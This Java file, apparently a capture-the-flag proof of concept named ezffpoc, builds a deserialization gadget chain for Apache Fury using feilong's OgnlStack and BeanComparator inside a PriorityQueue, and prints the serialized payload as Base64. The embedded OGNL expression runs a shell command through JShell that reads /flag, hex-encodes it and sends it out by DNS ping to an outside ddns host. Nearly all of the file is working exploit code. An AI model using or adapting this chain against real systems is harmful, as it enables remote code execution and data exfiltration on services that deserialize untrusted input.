import com.feilong.lib.beanutils.BeanComparator;
import com.feilong.lib.excel.ognl.OgnlStack;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import sun.misc.Unsafe;

public class ezffpoc {
    public static void main(String[] args) throws Exception {
        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Module baseModule = Object.class.getModule();
        Class currentClass = ezffpoc.class;
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.getAndSetObject(currentClass, addr, baseModule);
        // OgnlStack#getValue sink feilong
        OgnlStack ognlStack = new OgnlStack(null);
        String expression = "@jdk.jshell.JShell@create().eval('Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"ping $(xxd -p -c 256 /flag|cut -c51-100).7c3fd22af4.ddns.1433.eu.org\"});')";
        Method getExpression = ognlStack.getClass().getDeclaredMethod("getExpression", String.class);
        getExpression.setAccessible(true);
        Object expCache = getExpression.invoke(ognlStack, expression);
        Field expressionsMapField = ognlStack.getClass().getDeclaredField("expressionsMap");
        expressionsMapField.setAccessible(true);
        HashMap cacheMap = new HashMap<>();
        cacheMap.put("yyy",expCache);
        expressionsMapField.set(ognlStack, cacheMap);
        // BeanComparator#compare -> getter feilong
        BeanComparator comparator = new BeanComparator();
        setFieldValue(comparator,"property","value(yyy)");
        // PriorityQueue#readObject -> compare java原生
        PriorityQueue queue = new PriorityQueue();
        setFieldValue(queue,"comparator",comparator);
        setFieldValue(queue,"queue",new Object[]{ognlStack,ognlStack}); // beanComparator.compare(o,o)
        setFieldValue(queue,"size",2);
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).withRefTracking(true).build();
        byte[] serialize = fury.serialize(queue);
        String data = Base64.getEncoder().encodeToString(serialize);
        System.out.println(data);
        System.out.println(data.length());
//        Object deserialize = fury.deserialize(Base64.getDecoder().decode(data));
    }
    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);
            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}